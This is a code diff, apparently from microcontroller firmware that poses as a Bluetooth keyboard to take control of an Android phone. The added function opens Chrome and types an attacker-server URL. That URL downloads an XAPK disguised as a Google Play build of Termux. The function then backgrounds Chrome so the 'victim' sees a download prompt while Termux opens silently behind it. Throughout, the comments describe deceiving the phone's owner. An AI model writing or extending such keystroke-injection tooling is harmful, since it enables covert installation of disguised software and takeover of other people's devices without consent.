@@ -70,27 +70,38 @@ void openApp(const char* appName, int waitMs = 3000) {
   pressEnter(waitMs);      // Enter → open top result → wait for app to load
 }
 
-// ── Open Chrome as a distraction ──────────────────────────────────────────────
-// Opens Chrome, navigates to the ngrok URL (shows the server page to the victim),
-// then presses Home to background Chrome and return to the launcher.
-// Termux can then be opened silently — victim sees Chrome on screen, not Termux.
+// ── APK filename to serve ─────────────────────────────────────────────────────
+// Place this file in  server/apk/  on your computer.
+// The server exposes it at  WAN_SERVER_URL/apk/<APK_FILENAME>.
+// Chrome on Android will show its download prompt when navigated to this URL.
+#define APK_FILENAME "com.termux_googleplay.2026.10.09.xapk"
+
+// ── Open Chrome and trigger the XAPK download ────────────────────────────────
+// 1. Opens Chrome via launcher search
+// 2. Navigates to WAN_SERVER_URL/apk/APK_FILENAME
+// 3. Chrome's download manager catches the attachment → shows download prompt
+// 4. Waits for the download prompt to appear
+// 5. Presses Home — Chrome (with its download prompt) stays visible to victim
+// Termux is then opened silently in the background.
 void openChromeDistraction() {
-  Serial.println("  [distraction] Opening Chrome...");
-  openApp("Chrome", 3000);                    // launch Chrome via search
+  Serial.println("  [apk] Opening Chrome...");
+  openApp("Chrome", 3000);  // Win → Home → type "Chrome" → Enter → wait 3 s
 
-  // Chrome is now open — type the ngrok URL in the address bar.
-  // On Android, Ctrl+L focuses the address bar from anywhere inside Chrome.
+  // Focus the Chrome address bar (Ctrl+L works on all Android Chrome versions)
   bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('l');
-  delay(120); bleKeyboard.releaseAll(); delay(600);
+  delay(120); bleKeyboard.releaseAll(); delay(700);
 
-  // Type the server URL — victim sees a legitimate-looking page
-  typeString(WAN_SERVER_URL "/files", 40);    // /files shows the gallery page
-  pressEnter(4000);                           // wait 4 s for page to load
+  // Navigate to the XAPK download URL served from server/apk/
+  // Chrome will hit /apk/<filename> → server sends Content-Disposition: attachment
+  // → Android download manager intercepts → "Download" prompt appears on screen
+  typeString(WAN_SERVER_URL "/apk/" APK_FILENAME, 40);
+  pressEnter(5000);  // wait 5 s — time for ngrok round-trip + download prompt
 
-  Serial.println("  [distraction] Chrome loaded — going Home to background it.");
+  Serial.println("  [apk] XAPK download prompt should be visible in Chrome.");
+  Serial.println("  [apk] Going Home — Chrome stays in foreground, Termux opens behind.");
 
-  // Press Home — Chrome stays open in background (recent apps),
-  // victim's last visible screen is Chrome. Now open Termux silently.
+  // Win key — backgrounds Chrome (download prompt stays in notification bar),
+  // victim sees Chrome / download toast, not Termux.
   goHome(1200);
 }
 
